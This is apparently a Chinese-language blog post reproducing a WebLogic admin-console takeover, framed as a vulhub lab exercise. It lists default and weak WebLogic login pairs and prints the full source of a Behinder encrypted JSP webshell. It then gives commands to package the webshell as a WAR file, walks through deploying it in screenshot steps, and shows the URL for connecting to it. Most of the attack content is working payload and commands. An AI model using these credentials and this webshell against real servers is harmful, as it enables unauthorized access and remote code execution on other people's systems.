---
title: weblogic后台getshell
date: 2020-07-15 20:53:14
categories: 漏洞复现
tags: Weblogic
---

#### 复现过程

1.登陆

`http://IP:端口/console`

![](http://qn.laohuan.xin/2020-07-15_17-28-53.png)



要在后台getshell，必须得先登录，如何获取到登陆凭证，弱口令、爆破，或者其他社工方式。

<!--more-->

weblogic常见口令

| system      | password    |
| ----------- | ----------- |
| weblogic    | weblogic    |
| guest       | guest       |
| portaladmin | portaladmin |
| admin       | security    |
| joe         | password    |
| mary        | password    |
| system      | security    |
| wlcsystem   | wlcsystem   |
| wlcsystem   | sipisystem  |

2.制作war包

新建shell.jsp文件，内容为冰蝎webshell

```jsp
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends Class
Loader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b
.length);}}%><%if(request.getParameter("pass")!=null){String k=(""+UUID.randomUUID()).rep
lace("-","").substring(16);session.putValue("u",k);out.print(k);return;}Cipher c=Cipher.g
etInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES")
);new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decode
Buffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>
```

压缩webshell

`zip shell.zip shell.jsp`

改变后缀

`mv shell.zip shell.war`

3.部署

![](http://qn.laohuan.xin/2020-07-15_17-12-27.png)

3.上载文件

![](http://qn.laohuan.xin/2020-07-15_17-13-09.png)

4.选择我们做好的shell.war

![](http://qn.laohuan.xin/2020-07-15_17-13-28.png)

5.下一步

![](http://qn.laohuan.xin/2020-07-15_17-14-20.png)

6.下一步，安装为应用程序

![](http://qn.laohuan.xin/2020-07-15_17-14-46.png)

7.下一步

![](http://qn.laohuan.xin/2020-07-15_17-15-16.png)

8.点击完成

![](http://qn.laohuan.xin/2020-07-15_17-15-40.png)

9.点击保存，显示设置成功

![](http://qn.laohuan.xin/2020-07-15_17-18-45.png)

10.当再次点击菜单栏的[部署]时，已经可以看到我们部署的应用程序

![](http://qn.laohuan.xin/2020-07-15_17-19-10.png)

11.使用冰蝎连接

`http://IP:端口/shell/shell.jsp`

![](http://qn.laohuan.xin/2020-07-15_17-10-22.png)

#### 参考链接

<http://github.com/vulhub/vulhub/tree/master/weblogic/weak_password/>

<http://www.cnblogs.com/bmjoker/p/9822886.html/>

<http://www.pianshen.com/article/9302224952//>